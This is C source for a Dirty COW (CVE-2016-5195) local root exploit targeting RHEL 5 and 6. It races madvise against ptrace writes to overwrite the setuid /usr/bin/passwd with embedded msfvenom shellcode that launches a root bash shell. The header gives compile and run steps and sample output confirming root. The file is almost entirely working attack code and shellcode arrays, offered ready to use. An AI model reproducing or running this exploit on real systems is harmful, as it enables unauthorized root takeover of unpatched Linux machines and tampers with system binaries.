/*
* A PTRACE_POKEDATA variant of CVE-2016-5195
* should work on RHEL 5 & 6
* 
* (un)comment correct payload (x86 or x64)!
* $ gcc -pthread c0w.c  -o c0w
* $ ./c0w
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* mmap fa65a000
* madvise 0
* ptrace 0
* $ /usr/bin/passwd 
* [root@server foo]# whoami 
* root
* [root@server foo]# id
* uid=0(root) gid=501(foo) groups=501(foo)
* @KrE80r
*/
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";


/*
* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
* 
unsigned char shell_code[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
} */

unsigned char shell_code[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xf8, 0x00, 0x00, 0x00,
  0x9c, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0xd9, 0xc0, 0xd9, 0x74, 0x24, 0xf4, 0x58, 0xbe, 0x53, 0xc8, 0xf8, 0x39,
  0x31, 0xc9, 0xb1, 0x23, 0x83, 0xc0, 0x04, 0x31, 0x70, 0x14, 0x03, 0x70,
  0x47, 0x2a, 0x0d, 0x08, 0xbc, 0xc0, 0xf9, 0x33, 0x8f, 0x95, 0x37, 0x1f,
  0x65, 0x81, 0x6f, 0x52, 0xf9, 0xc7, 0x85, 0x32, 0xc8, 0xcc, 0x6d, 0x29,
  0x79, 0xb0, 0xc2, 0xc4, 0x7f, 0x86, 0x83, 0x91, 0x9e, 0x2b, 0xcb, 0x35,
  0x3b, 0xdc, 0x0c, 0x91, 0xaa, 0x8d, 0xe5, 0xe0, 0xcc, 0xa8, 0xcc, 0x6d,
  0x2d, 0xd8, 0x48, 0x36, 0xfd, 0x4c, 0xc2, 0x4f, 0x1c, 0x2d, 0x21, 0xcf,
  0x5b, 0x72, 0xc0, 0xc9, 0x2d, 0x07, 0x0e, 0x82, 0x13, 0xe7, 0x70, 0x52,
  0x0b, 0x82, 0x70, 0x38, 0xae, 0xdb, 0x92, 0x8d, 0x79, 0x16, 0xd4, 0x6b,
  0xb9, 0xd0, 0x68, 0x98, 0x1e, 0x91, 0x94, 0xe6, 0x60, 0xc5, 0x9a, 0x18,
  0xe9, 0x06, 0x5b, 0xf3, 0xe5, 0x09, 0xbf, 0x08, 0x45, 0xf4, 0x8d, 0x91,
  0x20, 0xc7, 0x76, 0x82, 0x71, 0x41, 0x67, 0x3b, 0x37, 0x3b, 0xd8, 0x3f,
  0xfa, 0x3c, 0x9d, 0x80, 0x7c, 0x3f, 0x61, 0xe1, 0xc4, 0x3e, 0x9d, 0xe2,
  0x34, 0xfa, 0x9c, 0xe2, 0x34, 0xfc, 0x53, 0x62  
};
unsigned int sc_len = 248;

/*
* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
unsigned char shell_code[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;
*/

void *madviseThread(void *arg) {
  int i,c=0;
  for(i=0;i<200000000;i++)
    c+=madvise(map,100,MADV_DONTNEED);
  printf("madvise %d\n\n",c);
}


int main(int argc,char *argv[]){

  printf("                                \n\
   (___)                                   \n\
   (o o)_____/                             \n\
    @@ `     \\                            \n\
     \\ ____, /%s                          \n\
     //    //                              \n\
    ^^    ^^                               \n\
", suid_binary);
  char *backup;
  printf("DirtyCow root privilege escalation\n");
  printf("Backing up %s to /tmp/bak\n", suid_binary);
  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
  system(backup);

  f=open(suid_binary,O_RDONLY);
  fstat(f,&st);
  map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pid=fork();
  if(pid){
    waitpid(pid,NULL,0);
    int u,i,o,c=0,l=sc_len;
    for(i=0;i<10000/l;i++)
      for(o=0;o<l;o++)
        for(u=0;u<10000;u++){
          c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));
	  //printf("tick");
	}
    printf("ptrace %d\n\n",c);
   }
  else{
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);
    pthread_join(pth,NULL);
    }
  return 0;
}
